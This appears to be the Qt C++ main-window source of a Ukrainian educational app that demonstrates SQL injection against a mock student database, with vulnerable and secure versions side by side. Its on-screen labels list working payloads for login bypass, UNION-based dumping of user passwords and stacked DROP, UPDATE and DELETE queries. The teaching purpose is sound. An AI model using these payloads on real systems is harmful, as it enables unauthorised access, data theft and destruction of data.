/*
 * MainWindow.cpp
 *
 * Реалізація головного вікна застосунку.
 * UI для демонстрації SQL-ін'єкцій.
 */

#include "MainWindow.h"
#include "VulnerableQueries.h"
#include "SecureQueries.h"
#include "AttackLogger.h"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QGridLayout>
#include <QGroupBox>
#include <QMessageBox>
#include <QHeaderView>
#include <QDebug>
#include <QStatusBar>
#include <QApplication>
#include <QScreen>
#include <QPainter>

/**
 * @brief Конструктор головного вікна.
 */
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
{
    // Налаштування вікна.
    setWindowTitle("SQL Injection - Система управління студентами");
    setMinimumSize(1400, 900);
    setWindowIcon(createProgramIcon());

    // Створення UI.
    setupUI();

    // Застосування теми.
    applyModernDarkTheme();

    // Центрування вікна на екрані.
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QRect screenGeometry = screen->geometry();
        int x = (screenGeometry.width() - width()) / 2;
        int y = (screenGeometry.height() - height()) / 2;
        move(x, y);
    }

    qDebug() << "[MAIN] Application started successfully with new design";
}

/**
 * @brief Деструктор.
 */
MainWindow::~MainWindow()
{
    qDebug() << "[MAIN] Application closing";
}

/**
 * @brief Створення іконки програми.
 */
QIcon MainWindow::createProgramIcon() {
    QPixmap pixmap(128, 128);
    pixmap.fill(Qt::transparent);

    QPainter painter(&pixmap);
    painter.setRenderHint(QPainter::Antialiasing);

    // Бірюзове коло з градієнтом.
    QRadialGradient gradient(64, 64, 64);
    gradient.setColorAt(0, QColor(0, 230, 232));
    gradient.setColorAt(0.5, QColor(0, 206, 209));
    gradient.setColorAt(1, QColor(0, 153, 153));

    painter.setBrush(gradient);
    painter.setPen(Qt::NoPen);
    painter.drawEllipse(8, 8, 112, 112);

    // Символ безпеки.
    painter.setPen(QPen(QColor("#1a1a1a"), 6));
    painter.setFont(QFont("Arial", 48, QFont::Bold));
    painter.drawText(pixmap.rect(), Qt::AlignCenter, "🔐");

    return QIcon(pixmap);
}

/**
 * @brief Застосування сучасної темної теми.
 */
void MainWindow::applyModernDarkTheme() {
    QString modernTheme = R"(
        /* ========== Головне вікно ========== */
        QMainWindow {
            background: #1a1a1a;
        }

        QWidget {
            background: #1a1a1a;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        /* ========== Вкладки ========== */
        QTabWidget::pane {
            border: 2px solid #00CED1;
            border-radius: 10px;
            background: #1a1a1a;
            padding: 10px;
        }

        QTabBar::tab {
            background: #2a2a2a;
            color: #e0e0e0;
            padding: 12px 25px;
            margin-right: 5px;
            border: 1px solid #3a3a3a;
            border-bottom: none;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            font-size: 13px;
        }

        QTabBar::tab:selected {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                stop:0 #00CED1, stop:1 #008B8B);
            color: #000000;
            font-weight: bold;
        }

        QTabBar::tab:hover:!selected {
            background: #3a3a3a;
            color: #00E5E8;
        }

        /* ========== Групи (QGroupBox) ========== */
        QGroupBox {
            border: 2px solid #00CED1;
            border-radius: 10px;
            margin-top: 15px;
            padding-top: 15px;
            background: #1a1a1a;
            font-size: 13px;
            font-weight: bold;
            color: #00E5E8;
        }

        QGroupBox::title {
            subcontrol-origin: margin;
            subcontrol-position: top left;
            left: 15px;
            padding: 5px 10px;
            background: #1a1a1a;
            color: #00CED1;
        }

        /* ========== Поля введення ========== */
        QLineEdit, QTextEdit, QComboBox {
            background: #2a2a2a;
            border: 2px solid #3a3a3a;
            border-radius: 8px;
            padding: 8px;
            color: #e0e0e0;
            font-size: 12px;
        }

        QLineEdit:focus, QTextEdit:focus, QComboBox:focus {
            border-color: #00CED1;
            background: #2f2f2f;
        }

        QLineEdit:read-only {
            background: #252525;
            color: #999;
        }

        /* ========== Випадаючі списки ========== */
        QComboBox::drop-down {
            border: none;
            width: 30px;
        }

        QComboBox QAbstractItemView {
            background: #2a2a2a;
            color: #e0e0e0;
            selection-background-color: #00CED1;
            selection-color: #000000;
            border: 1px solid #3a3a3a;
        }

        /* ========== Таблиці ========== */
        QTableWidget {
            background: #2a2a2a;
            border: 2px solid #3a3a3a;
            border-radius: 8px;
            gridline-color: #3a3a3a;
            color: #e0e0e0;
        }

        QTableWidget::item {
            padding: 8px;
        }

        QTableWidget::item:selected {
            background: rgba(0, 206, 209, 0.3);
        }

        QTableWidget::item:alternate {
            background: #2f2f2f;
        }

        QHeaderView::section {
            background: #3a3a3a;
            color: #00E5E8;
            padding: 8px;
            border: 1px solid #4a4a4a;
            font-weight: bold;
        }

        /* ========== Чекбокси ========== */
        QCheckBox {
            spacing: 8px;
            color: #e0e0e0;
        }

        QCheckBox::indicator {
            width: 20px;
            height: 20px;
            border: 2px solid #3a3a3a;
            border-radius: 4px;
            background: #2a2a2a;
        }

        QCheckBox::indicator:checked {
            background: #00CED1;
            border-color: #00CED1;
        }

        QCheckBox::indicator:hover {
            border-color: #00CED1;
        }

        /* ========== Прогрес-бар ========== */
        QProgressBar {
            border: 2px solid #3a3a3a;
            border-radius: 8px;
            text-align: center;
            background: #2a2a2a;
            color: #e0e0e0;
            font-weight: bold;
        }

        QProgressBar::chunk {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #00CED1, stop:1 #009999);
            border-radius: 6px;
        }

        /* ========== Скролл-бар ========== */
        QScrollBar:vertical {
            background: #2a2a2a;
            width: 12px;
            border-radius: 6px;
        }

        QScrollBar::handle:vertical {
            background: #4a4a4a;
            border-radius: 6px;
            min-height: 20px;
        }

        QScrollBar::handle:vertical:hover {
            background: #00CED1;
        }

        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
            height: 0px;
        }

        QScrollBar:horizontal {
            background: #2a2a2a;
            height: 12px;
            border-radius: 6px;
        }

        QScrollBar::handle:horizontal {
            background: #4a4a4a;
            border-radius: 6px;
            min-width: 20px;
        }

        QScrollBar::handle:horizontal:hover {
            background: #00CED1;
        }
    )";

    setStyleSheet(modernTheme);
}

/**
 * @brief Налаштування головного UI.
 */
void MainWindow::setupUI()
{
    // Центральний віджет.
    QWidget* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);

    // Головний layout.
    QVBoxLayout* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setSpacing(15);
    mainLayout->setContentsMargins(20, 20, 20, 20);

    // ========== ЗАГОЛОВОК ==========
    QLabel* titleLabel = new QLabel(
        "SQL Injection - Система управління студентами",
        this
        );

    QFont titleFont;
    titleFont.setPointSize(18);
    titleFont.setBold(true);
    titleLabel->setFont(titleFont);
    titleLabel->setAlignment(Qt::AlignCenter);
    titleLabel->setStyleSheet(
        "QLabel {"
        "   color: #00CED1;"
        "   padding: 15px;"
        "   background: rgba(0, 206, 209, 0.1);"
        "   border-radius: 10px;"
        "}"
        );
    mainLayout->addWidget(titleLabel);

    // ========== ПОПЕРЕДЖЕННЯ ==========
    QLabel* warningLabel = new QLabel(
        "Демонструє вразливості SQL-ін'єкцій та методи захисту.",
        this
        );
    warningLabel->setStyleSheet(
        "QLabel {"
        "   font-size: 11px;"
        "   color: #fbbf24;"
        "   background: rgba(251, 191, 36, 0.1);"
        "   padding: 12px;"
        "   border-radius: 8px;"
        "   border: 1px solid #fbbf24;"
        "}"
        );
    warningLabel->setAlignment(Qt::AlignCenter);
    warningLabel->setWordWrap(true);
    mainLayout->addWidget(warningLabel);

    // ========== ВКЛАДКИ ==========
    tabWidget = new QTabWidget(this);

    // Додавання вкладок.
    tabWidget->addTab(createLoginTab(), "Авторизація");
    tabWidget->addTab(createSearchTab(), "Пошук студентів");
    tabWidget->addTab(createFilterTab(), "Фільтрація");
    tabWidget->addTab(createCommentsTab(), "Коментарі");
    tabWidget->addTab(createLogsTab(), "Логи атак");
    tabWidget->addTab(createInfoTab(), "Інформація");

    mainLayout->addWidget(tabWidget);

    // ========== СТАТУС БАР ==========
    statusBar()->setStyleSheet(
        "QStatusBar {"
        "   background: #1a1a1a;"
        "   color: #00CED1;"
        "   font-size: 11px;"
        "   border-top: 1px solid #3a3a3a;"
        "}"
        );
    statusBar()->showMessage("База даних ініціалізована | Готово до роботи");
}

/*
 * ============================================================================
 * ВКЛАДКА 1: АВТОРИЗАЦІЯ
 * ============================================================================
 */

QWidget* MainWindow::createLoginTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);

    // ========== ОПИС ВКЛАДКИ ==========
    QLabel* descLabel = new QLabel(
        "Ця вкладка демонструє найпростішу форму SQL-ін'єкції - обхід автентифікації.\n"
        "Спробуйте ввести: admin' OR '1'='1 (у поле логіну) та порівняйте результати!",
        this
        );
    descLabel->setStyleSheet(
        "QLabel {"
        "   color: #a0a0a0;"
        "   font-size: 11px;"
        "   padding: 10px;"
        "   background: rgba(255, 255, 255, 0.05);"
        "   border-radius: 5px;"
        "}"
        );
    descLabel->setWordWrap(true);
    mainLayout->addWidget(descLabel);

    // ========== ГОРИЗОНТАЛЬНИЙ LAYOUT ==========
    QHBoxLayout* contentLayout = new QHBoxLayout();

    // ========== ЛІВА ЧАСТИНА: Форма входу ==========
    QVBoxLayout* leftLayout = new QVBoxLayout();

    QGroupBox* formGroup = new QGroupBox("Форма авторизації", this);
    QGridLayout* formLayout = new QGridLayout(formGroup);

    // --- Поле: Логін ---
    QLabel* usernameLabel = new QLabel("Логін:", this);
    usernameLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    login_usernameEdit = new QLineEdit(this);
    login_usernameEdit->setPlaceholderText("Введіть логін");

    formLayout->addWidget(usernameLabel, 0, 0);
    formLayout->addWidget(login_usernameEdit, 0, 1);

    // --- Поле: Пароль ---
    QLabel* passwordLabel = new QLabel("Пароль:", this);
    passwordLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    login_passwordEdit = new QLineEdit(this);
    login_passwordEdit->setPlaceholderText("Введіть пароль");
    login_passwordEdit->setEchoMode(QLineEdit::Password);

    formLayout->addWidget(passwordLabel, 1, 0);
    formLayout->addWidget(login_passwordEdit, 1, 1);

    leftLayout->addWidget(formGroup);

    // --- Кнопки дій ---
    QVBoxLayout* buttonsLayout = new QVBoxLayout();

    login_vulnerableBtn = new QPushButton("Вразливий вхід", this);
    login_vulnerableBtn->setMinimumHeight(50);
    login_vulnerableBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:0, y2:1,"
        "       stop:0 #dc2626, stop:1 #991b1b);"
        "   color: #ffffff;"
        "   font-size: 14px;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover {"
        "   background: qlineargradient(x1:0, y1:0, x2:0, y2:1,"
        "       stop:0 #ef4444, stop:1 #dc2626);"
        "}"
        "QPushButton:pressed {"
        "   background: #991b1b;"
        "}"
        );
    connect(login_vulnerableBtn, &QPushButton::clicked,
            this, &MainWindow::onVulnerableLogin);
    buttonsLayout->addWidget(login_vulnerableBtn);

    login_secureBtn = new QPushButton("Захищений вхід", this);
    login_secureBtn->setMinimumHeight(50);
    login_secureBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:1, y2:0,"
        "       stop:0 #00CED1, stop:1 #009999);"
        "   color: #000000;"
        "   font-size: 14px;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover {"
        "   background: qlineargradient(x1:0, y1:0, x2:1, y2:0,"
        "       stop:0 #00E5E8, stop:1 #00B8B8);"
        "}"
        "QPushButton:pressed {"
        "   background: #009999;"
        "}"
        );
    connect(login_secureBtn, &QPushButton::clicked,
            this, &MainWindow::onSecureLogin);
    buttonsLayout->addWidget(login_secureBtn);

    leftLayout->addLayout(buttonsLayout);

    // --- Приклади атак ---
    QGroupBox* examplesGroup = new QGroupBox("Приклади атак", this);
    QVBoxLayout* examplesLayout = new QVBoxLayout(examplesGroup);

    QLabel* examplesLabel = new QLabel(
        "1. Логін: <b>admin' OR '1'='1</b>, Пароль: [будь-що]<br>"
        "   → Обхід автентифікації<br><br>"
        "2. Логін: <b>admin'--</b>, Пароль: [будь-що]<br>"
        "   → Коментування перевірки пароля<br><br>"
        "3. Логін: <b>' OR 1=1--</b>, Пароль: [будь-що]<br>"
        "   → Вхід як перший користувач<br><br>"
        "<i>Легітимні облікові записи:</i><br>"
        "• admin / admin123<br>"
        "• teacher / teacher123<br>"
        "• ivan / password123",
        this
        );
    examplesLabel->setStyleSheet("color: #a0a0a0; font-size: 11px;");
    examplesLabel->setWordWrap(true);
    examplesLayout->addWidget(examplesLabel);

    leftLayout->addWidget(examplesGroup);
    leftLayout->addStretch();

    contentLayout->addLayout(leftLayout, 1);

    // ========== ПРАВА ЧАСТИНА: Результат ==========
    QVBoxLayout* rightLayout = new QVBoxLayout();

    QGroupBox* resultGroup = new QGroupBox("Результат авторизації", this);
    QVBoxLayout* resultLayout = new QVBoxLayout(resultGroup);

    login_resultEdit = new QTextEdit(this);
    login_resultEdit->setReadOnly(true);
    login_resultEdit->setPlaceholderText(
        "Результат з'явиться тут після спроби входу...\n\n"
        );
    login_resultEdit->setStyleSheet(
        "QTextEdit {"
        "   background: #2a2a2a;"
        "   color: #e0e0e0;"
        "   border: 2px solid #3a3a3a;"
        "   border-radius: 8px;"
        "   padding: 15px;"
        "   font-size: 12px;"
        "   font-family: 'Courier New', monospace;"
        "}"
        );
    resultLayout->addWidget(login_resultEdit);

    rightLayout->addWidget(resultGroup);

    contentLayout->addLayout(rightLayout, 1);

    mainLayout->addLayout(contentLayout);

    return tab;
}

/*
 * ============================================================================
 * ВКЛАДКА 2: ПОШУК СТУДЕНТІВ
 * ============================================================================
 */

QWidget* MainWindow::createSearchTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);

    // ========== ОПИС ==========
    QLabel* descLabel = new QLabel(
        "Демонстрація UNION-based SQL injection - найпопулярнішого типу атаки.\n"
        "Спробуйте: %' UNION SELECT id, username, password, role, '1', 1.0, 'leaked', '000' FROM users --",
        this
        );
    descLabel->setStyleSheet(
        "QLabel {"
        "   color: #a0a0a0;"
        "   font-size: 11px;"
        "   padding: 10px;"
        "   background: rgba(255, 255, 255, 0.05);"
        "   border-radius: 5px;"
        "}"
        );
    descLabel->setWordWrap(true);
    mainLayout->addWidget(descLabel);

    // ========== ГОРИЗОНТАЛЬНИЙ LAYOUT ==========
    QHBoxLayout* contentLayout = new QHBoxLayout();

    // ========== ЛІВА ЧАСТИНА: Пошук ==========
    QVBoxLayout* leftLayout = new QVBoxLayout();

    QGroupBox* searchGroup = new QGroupBox("Пошук студентів", this);
    QVBoxLayout* searchLayout = new QVBoxLayout(searchGroup);

    QLabel* searchLabel = new QLabel("Пошуковий термін:", this);
    searchLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    searchLayout->addWidget(searchLabel);

    search_termEdit = new QLineEdit(this);
    search_termEdit->setPlaceholderText("Введіть ім'я або прізвище");
    searchLayout->addWidget(search_termEdit);

    // Кнопки.
    search_vulnerableBtn = new QPushButton("Вразливий пошук", this);
    search_vulnerableBtn->setMinimumHeight(45);
    search_vulnerableBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:0, y2:1,"
        "       stop:0 #dc2626, stop:1 #991b1b);"
        "   color: white;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #ef4444; }"
        );
    connect(search_vulnerableBtn, &QPushButton::clicked,
            this, &MainWindow::onVulnerableSearch);
    searchLayout->addWidget(search_vulnerableBtn);

    search_secureBtn = new QPushButton("Захищений пошук", this);
    search_secureBtn->setMinimumHeight(45);
    search_secureBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:1, y2:0,"
        "       stop:0 #00CED1, stop:1 #009999);"
        "   color: black;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #00E5E8; }"
        );
    connect(search_secureBtn, &QPushButton::clicked,
            this, &MainWindow::onSecureSearch);
    searchLayout->addWidget(search_secureBtn);

    leftLayout->addWidget(searchGroup);

    // --- Приклади ---
    QGroupBox* examplesGroup = new QGroupBox("Приклади атак", this);
    QVBoxLayout* examplesLayout = new QVBoxLayout(examplesGroup);

    QLabel* examplesLabel = new QLabel(
        "<b>UNION-based injection:</b><br>"
        "<code>%' UNION SELECT id, username, password, role, '1', 1.0, 'leaked', '000' FROM users --</code><br><br>"
        "<b>Boolean-based:</b><br>"
        "<code>%' OR '1'='1</code><br><br>"
        "<b>Легітимний пошук:</b><br>"
        "Іван, Марія, Петренко",
        this
        );
    examplesLabel->setStyleSheet("color: #a0a0a0; font-size: 10px;");
    examplesLabel->setWordWrap(true);
    examplesLayout->addWidget(examplesLabel);

    leftLayout->addWidget(examplesGroup);
    leftLayout->addStretch();

    contentLayout->addLayout(leftLayout, 1);

    // ========== ПРАВА ЧАСТИНА: Результати ==========
    QVBoxLayout* rightLayout = new QVBoxLayout();

    search_infoLabel = new QLabel("", this);
    search_infoLabel->setStyleSheet(
        "QLabel {"
        "   color: #00CED1;"
        "   font-weight: bold;"
        "   padding: 5px;"
        "}"
        );
    rightLayout->addWidget(search_infoLabel);

    search_resultsTable = new QTableWidget(this);
    search_resultsTable->setAlternatingRowColors(true);
    search_resultsTable->horizontalHeader()->setStretchLastSection(true);
    rightLayout->addWidget(search_resultsTable);

    contentLayout->addLayout(rightLayout, 2);

    mainLayout->addLayout(contentLayout);

    return tab;
}

/*
 * ============================================================================
 * ВКЛАДКА 3: ФІЛЬТРАЦІЯ ЗА ФАКУЛЬТЕТОМ
 * ============================================================================
 */

QWidget* MainWindow::createFilterTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);

    // ========== ОПИС ==========
    QLabel* descLabel = new QLabel(
        "Демонстрація Boolean-based SQL injection через фільтрацію.\n"
        "Спробуйте: Інформатика' OR '1'='1 (у довільному полі) для обходу фільтра.",
        this
        );
    descLabel->setStyleSheet(
        "QLabel {"
        "   color: #a0a0a0;"
        "   font-size: 11px;"
        "   padding: 10px;"
        "   background: rgba(255, 255, 255, 0.05);"
        "   border-radius: 5px;"
        "}"
        );
    descLabel->setWordWrap(true);
    mainLayout->addWidget(descLabel);

    // ========== ГОРИЗОНТАЛЬНИЙ LAYOUT ==========
    QHBoxLayout* contentLayout = new QHBoxLayout();

    // ========== ЛІВА ЧАСТИНА: Фільтри ==========
    QVBoxLayout* leftLayout = new QVBoxLayout();

    QGroupBox* filterGroup = new QGroupBox("Фільтрація студентів", this);
    QVBoxLayout* filterLayout = new QVBoxLayout(filterGroup);

    // --- Випадаючий список факультетів ---
    QLabel* comboLabel = new QLabel("Виберіть факультет:", this);
    comboLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    filterLayout->addWidget(comboLabel);

    filter_facultyCombo = new QComboBox(this);
    filter_facultyCombo->addItem("-- Виберіть факультет --");
    filter_facultyCombo->addItem("Інформатика");
    filter_facultyCombo->addItem("Математика");
    filter_facultyCombo->addItem("Фізика");
    filter_facultyCombo->addItem("Економіка");
    filter_facultyCombo->addItem("Хімія");
    filter_facultyCombo->addItem("Біологія");
    filterLayout->addWidget(filter_facultyCombo);

    // --- або довільне поле ---
    QLabel* orLabel = new QLabel("--- або довільний ввід ---", this);
    orLabel->setStyleSheet("color: #a0a0a0; font-style: italic;");
    orLabel->setAlignment(Qt::AlignCenter);
    filterLayout->addWidget(orLabel);

    QLabel* customLabel = new QLabel("Назва факультету:", this);
    customLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    filterLayout->addWidget(customLabel);

    filter_customEdit = new QLineEdit(this);
    filter_customEdit->setPlaceholderText("Введіть назву");
    filterLayout->addWidget(filter_customEdit);

    // Кнопки
    filter_vulnerableBtn = new QPushButton("Вразлива фільтрація", this);
    filter_vulnerableBtn->setMinimumHeight(45);
    filter_vulnerableBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:0, y2:1,"
        "       stop:0 #dc2626, stop:1 #991b1b);"
        "   color: #ffffff;"
        "   font-size: 13px;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover {"
        "   background: #ef4444;"
        "}"
        );
    connect(filter_vulnerableBtn, &QPushButton::clicked,
            this, &MainWindow::onVulnerableFilter);
    filterLayout->addWidget(filter_vulnerableBtn);

    filter_secureBtn = new QPushButton("Захищена фільтрація", this);
    filter_secureBtn->setMinimumHeight(45);
    filter_secureBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:1, y2:0,"
        "       stop:0 #00CED1, stop:1 #009999);"
        "   color: #000000;"
        "   font-size: 13px;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover {"
        "   background: #00E5E8;"
        "}"
        );
    connect(filter_secureBtn, &QPushButton::clicked,
            this, &MainWindow::onSecureFilter);
    filterLayout->addWidget(filter_secureBtn);

    leftLayout->addWidget(filterGroup);

    // --- Приклади атак ---
    QGroupBox* examplesGroup = new QGroupBox("Приклади атак", this);
    QVBoxLayout* examplesLayout = new QVBoxLayout(examplesGroup);

    QLabel* examplesLabel = new QLabel(
        "<b>Boolean-based (OR):</b><br>"
        "<code>Інформатика' OR '1'='1</code><br>"
        "→ Повертає ВСІХ студентів<br><br>"
        "<b>Comment injection:</b><br>"
        "<code>' OR 1=1 --</code><br>"
        "→ Обхід фільтра<br><br>"
        "<b>Легітимні значення:</b><br>"
        "Інформатика, Математика, Фізика, Економіка<br><br>"
        "<i>Примітка: Захищена версія використовує<br>"
        "WHITELIST валідацію + Prepared Statements!</i>",
        this
        );
    examplesLabel->setStyleSheet("color: #a0a0a0; font-size: 10px;");
    examplesLabel->setWordWrap(true);
    examplesLayout->addWidget(examplesLabel);

    leftLayout->addWidget(examplesGroup);
    leftLayout->addStretch();

    contentLayout->addLayout(leftLayout, 1);

    // ========== ПРАВА ЧАСТИНА: Результати ==========
    QVBoxLayout* rightLayout = new QVBoxLayout();

    QLabel* resultsLabel = new QLabel("Результати фільтрації:", this);
    resultsLabel->setStyleSheet(
        "QLabel {"
        "   color: #00CED1;"
        "   font-weight: bold;"
        "   font-size: 14px;"
        "   padding: 5px;"
        "}"
        );
    rightLayout->addWidget(resultsLabel);

    filter_resultsTable = new QTableWidget(this);
    filter_resultsTable->setAlternatingRowColors(true);
    filter_resultsTable->horizontalHeader()->setStretchLastSection(true);
    rightLayout->addWidget(filter_resultsTable);

    contentLayout->addLayout(rightLayout, 2);

    mainLayout->addLayout(contentLayout);

    return tab;
}

/*
 * ============================================================================
 * ВКЛАДКА 4: КОМЕНТАРІ
 * ============================================================================
 */

QWidget* MainWindow::createCommentsTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);

    // ========== ОПИС ==========
    QLabel* descLabel = new QLabel(
        "Демонстрація Stacked Queries - спроби виконати множинні SQL команди.\n"
        "Спробуйте: Test'); DROP TABLE students; -- (SQLite не підтримує, але MySQL/PostgreSQL - так!)",
        this
        );
    descLabel->setStyleSheet(
        "QLabel {"
        "   color: #a0a0a0;"
        "   font-size: 11px;"
        "   padding: 10px;"
        "   background: rgba(255, 255, 255, 0.05);"
        "   border-radius: 5px;"
        "}"
        );
    descLabel->setWordWrap(true);
    mainLayout->addWidget(descLabel);

    // ========== ГОРИЗОНТАЛЬНИЙ LAYOUT ==========
    QHBoxLayout* contentLayout = new QHBoxLayout();

    // ========== ЛІВА ЧАСТИНА: Форма коментаря ==========
    QVBoxLayout* leftLayout = new QVBoxLayout();

    QGroupBox* commentGroup = new QGroupBox("Додати коментар", this);
    QGridLayout* commentLayout = new QGridLayout(commentGroup);

    // --- ID студента ---
    QLabel* idLabel = new QLabel("ID студента:", this);
    idLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");

    comment_studentIdEdit = new QLineEdit(this);
    comment_studentIdEdit->setPlaceholderText("1-20");
    comment_studentIdEdit->setText("1");

    commentLayout->addWidget(idLabel, 0, 0);
    commentLayout->addWidget(comment_studentIdEdit, 0, 1);

    // --- Рейтинг ---
    QLabel* ratingLabel = new QLabel("Рейтинг:", this);
    ratingLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");

    comment_ratingCombo = new QComboBox(this);
    for (int i = 1; i <= 5; ++i) {
        comment_ratingCombo->addItem(QString("⭐ %1").arg(i), i);
    }
    comment_ratingCombo->setCurrentIndex(4);

    commentLayout->addWidget(ratingLabel, 1, 0);
    commentLayout->addWidget(comment_ratingCombo, 1, 1);

    leftLayout->addWidget(commentGroup);

    // --- Текст коментаря ---
    QLabel* textLabel = new QLabel("Текст коментаря:", this);
    textLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    leftLayout->addWidget(textLabel);

    comment_textEdit = new QTextEdit(this);
    comment_textEdit->setPlaceholderText(
        "Введіть ваш коментар тут..."
        );
    comment_textEdit->setMaximumHeight(120);
    leftLayout->addWidget(comment_textEdit);

    // --- Кнопки ---
    comment_vulnerableBtn = new QPushButton("Вразливе додавання", this);
    comment_vulnerableBtn->setMinimumHeight(45);
    comment_vulnerableBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:0, y2:1,"
        "       stop:0 #dc2626, stop:1 #991b1b);"
        "   color: white;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #ef4444; }"
        );
    connect(comment_vulnerableBtn, &QPushButton::clicked,
            this, &MainWindow::onVulnerableComment);
    leftLayout->addWidget(comment_vulnerableBtn);

    comment_secureBtn = new QPushButton("Захищене додавання", this);
    comment_secureBtn->setMinimumHeight(45);
    comment_secureBtn->setStyleSheet(
        "QPushButton {"
        "   background: qlineargradient(x1:0, y1:0, x2:1, y2:0,"
        "       stop:0 #00CED1, stop:1 #009999);"
        "   color: black;"
        "   font-weight: bold;"
        "   border-radius: 8px;"
        "   border: none;"
        "}"
        "QPushButton:hover { background: #00E5E8; }"
        );
    connect(comment_secureBtn, &QPushButton::clicked,
            this, &MainWindow::onSecureComment);
    leftLayout->addWidget(comment_secureBtn);

    // --- Приклади ---
    QGroupBox* examplesGroup = new QGroupBox("Приклади атак", this);
    QVBoxLayout* examplesLayout = new QVBoxLayout(examplesGroup);

    QLabel* examplesLabel = new QLabel(
        "<b>Stacked Queries (DROP):</b><br>"
        "<code>Test'); DROP TABLE students; --</code><br><br>"
        "<b>Stacked Queries (UPDATE):</b><br>"
        "<code>Good'); UPDATE students SET grade=5.0; --</code><br><br>"
        "<b>Stacked Queries (DELETE):</b><br>"
        "<code>Bad'); DELETE FROM comments; --</code><br><br>",
        this
        );
    examplesLabel->setStyleSheet("color: #a0a0a0; font-size: 10px;");
    examplesLabel->setWordWrap(true);
    examplesLayout->addWidget(examplesLabel);

    leftLayout->addWidget(examplesGroup);
    leftLayout->addStretch();

    contentLayout->addLayout(leftLayout, 1);

    // ========== ПРАВА ЧАСТИНА: Результат ==========
    QVBoxLayout* rightLayout = new QVBoxLayout();

    QGroupBox* resultGroup = new QGroupBox("Результат операції", this);
    QVBoxLayout* resultLayout = new QVBoxLayout(resultGroup);

    comment_resultEdit = new QTextEdit(this);
    comment_resultEdit->setReadOnly(true);
    comment_resultEdit->setPlaceholderText(
        "Результат додавання коментаря з'явиться тут..."
        );
    comment_resultEdit->setStyleSheet(
        "QTextEdit {"
        "   background: #2a2a2a;"
        "   color: #e0e0e0;"
        "   border: 2px solid #3a3a3a;"
        "   border-radius: 8px;"
        "   padding: 15px;"
        "   font-size: 12px;"
        "   font-family: 'Courier New', monospace;"
        "}"
        );
    resultLayout->addWidget(comment_resultEdit);

    rightLayout->addWidget(resultGroup);

    contentLayout->addLayout(rightLayout, 1);

    mainLayout->addLayout(contentLayout);

    return tab;
}

/*
 * ============================================================================
 * ВКЛАДКА 5: ЛОГИ АТАК
 * ============================================================================
 */

QWidget* MainWindow::createLogsTab()
{
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);

    // ========== ОПИС ==========
    QLabel* descLabel = new QLabel(
        "Перегляд всіх зареєстрованих спроб SQL-ін'єкцій.\n"
        "Система автоматично детектує та логує підозрілу активність.",
        this
        );
    descLabel->setStyleSheet(
        "QLabel {"
        "   color: #a0a0a0;"
        "   font-size: 11px;"
        "   padding: 10px;"
        "   background: rgba(255, 255, 255, 0.05);"
        "   border-radius: 5px;"
        "}"
        );
    descLabel->setWordWrap(true);
    mainLayout->addWidget(descLabel);

    // ========== ПАНЕЛЬ УПРАВЛІННЯ ==========
    QHBoxLayout* controlLayout = new QHBoxLayout();

    // Фільтр за типом.
    QLabel* filterLabel = new QLabel("Фільтр за типом:", this);
    filterLabel->setStyleSheet("color: #00E5E8; font-weight: bold;");
    controlLayout->addWidget(filterLabel);

    logs_filterCombo = new QComboBox(this);
    logs_filterCombo->addItem("Всі атаки", "");
    logs_filterCombo->addItem("UNION-based", "UNION-BASED");
    logs_filterCombo->addItem("Boolean-based (OR 1=1)", "BOOLEAN-BASED (OR 1=1)");
    logs_filterCombo->addItem("Stacked Queries (DROP)", "STACKED-QUERY (DROP)");
    logs_filterCombo->addItem("Stacked Queries (DELETE)", "STACKED-QUERY (DELETE)");
